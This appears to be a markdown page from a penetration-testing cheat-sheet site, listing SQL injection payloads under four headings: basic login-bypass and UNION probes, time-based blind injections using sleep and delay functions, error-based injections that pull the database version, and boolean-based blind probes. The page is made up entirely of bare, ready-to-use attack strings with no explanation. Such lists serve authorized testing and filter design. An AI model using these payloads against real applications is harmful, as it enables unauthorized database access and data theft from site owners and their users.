---
layout: default
title: SQL Injection Payloads
---

# 🗃️ SQL Injection Payloads

## Basic SQLi
```
' OR '1'='1
' OR 1=1--
' OR 1=1#
' OR 1=1/*
admin'--
admin'#
' UNION SELECT NULL--
' UNION SELECT 1,2,3--
```

## Time-based Blind SQLi
```
' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
'; WAITFOR DELAY '0:0:5'--
' OR pg_sleep(5)--
```

## Error-based SQLi
```
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--
' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

## Boolean-based Blind SQLi
```
' AND 1=1--
' AND 1=2--
' AND (SELECT SUBSTRING(@@version,1,1))='5'--
```